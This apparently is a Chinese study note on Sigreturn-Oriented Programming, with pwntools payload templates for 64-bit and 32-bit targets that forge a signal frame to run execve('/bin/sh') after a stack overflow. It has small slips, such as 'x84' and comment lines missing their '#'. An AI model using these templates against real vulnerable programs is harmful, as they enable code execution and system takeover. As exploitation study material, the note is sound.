Sigreturn Oriented programming(基于sigreturn的面向返回编程)

先分清两个完全不同的"进内核"

1.系统调用
- 主动进入内核
- 内核不会自动保存寄存器到用户栈
- 不会生成signal frame
- 不会跳handler
- 内核做完任务,直接回到用户态下一条指令

2.信号中断
进程突然收到信号(如SIGSEGV,SIGINT)
- 被动进内核
- 内核会把所有寄存器压倒用户栈 生成signal frame
- 内核会修改用户rip   跳去执行信号处理函数(handlerr)



sigreturn的系统调用号
x84  173
x64   15

系统执行sigreturn时会读取signal frame 值到寄存器中


64位下srop模板:

frame = SigreturnFrame()
frame.rax = 59      execve 系统调用号
frame.rdi =  bin_sh_addr 
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b'a'*offset + p64(pop_rax) + p64(15) + p64(syscall_addr) + bytes(frame)




32位下模板:

from pwn import *
 设置架构为 i386 
 context.arch = "i386" 
  1 伪造 Signal Frame 
  frame = SigreturnFrame() 
  # 2. 设置寄存器 
  frame.eax = 11   # execve 
  frame.ebx = binsh_addr 
  frame.ecx = 0 
  frame.edx = 0 
  # 3. 设置最后跳去执行 int 0x80 
  frame.eip = int0x80_addr 
  # 4. 拼接 payload 
  payload = b"A"*offset    # 填充 
  payload += p32(pop_eax_ret)   # eax = 173 
  payload += p32(173)    # rt_sigreturn 
  payload += p32(int0x80_addr)   # 触发系统调用 
  payload += bytes(frame)

# 注意
如果不是一次性跳入system那么,设置rsp的值很重要,rsp关系到系统调用结束后ret的地址.

小技巧:
对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。

